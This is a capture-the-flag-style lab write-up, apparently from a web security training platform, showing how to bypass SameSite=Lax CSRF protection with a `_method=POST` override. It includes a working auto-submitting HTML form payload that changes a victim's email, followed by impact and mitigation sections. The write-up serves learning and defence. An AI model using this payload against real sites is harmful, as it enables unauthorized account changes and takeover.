# Lab Name
SameSite Lax bypass via method override

## Vulnerability
Cross-Site Request Forgery (CSRF) – SameSite Lax Bypass via HTTP Method Override

## Objective
Exploit a CSRF vulnerability by bypassing the SameSite Lax cookie restriction using the HTTP method override technique and change the victim's email address.

## Entry Point
Change Email functionality

## Exploitation Type
Cross-Site Request Forgery (CSRF)

## Methodology
1. Open the lab and log in using the provided credentials

2. Navigate to the "My Account" page

3. Change the email address and intercept the request using Burp Suite

4. Observe that the application accepts the `_method=POST` parameter to override the HTTP method

5. Modify the request to use the GET method while adding the `_method=POST` parameter

6. Verify that the request is processed as a POST request by the application

7. Generate a CSRF PoC using the modified GET request

8. Upload the exploit to the Exploit Server

9. Deliver the exploit to the victim

10. When the victim visits the malicious page, the browser sends the request along with the SameSite=Lax cookie because it is a top-level GET request

11. Observe that the email address is changed successfully, solving the lab

## Payload Used

```html
<html>
  <body>
    <form action="https://0a9300a203419bda82a7b66700d50085.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="xyz@gmail.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Result
Successfully bypassed the SameSite Lax protection using the HTTP method override technique and changed the victim's email address.

## Impact
- Unauthorized account modifications
- Bypass of SameSite cookie protection
- User impersonation
- Account takeover opportunities
- Sensitive information modification

## Mitigation
- Do not rely solely on SameSite cookies for CSRF protection
- Disable unnecessary HTTP method override functionality
- Implement server-side CSRF token validation
- Validate Origin and Referer headers
- Require proper HTTP methods for sensitive operations

## Learning
SameSite=Lax provides protection only in specific scenarios and can be bypassed if an application supports HTTP method override.
Applications should implement robust server-side CSRF defenses instead of relying solely on browser cookie policies.
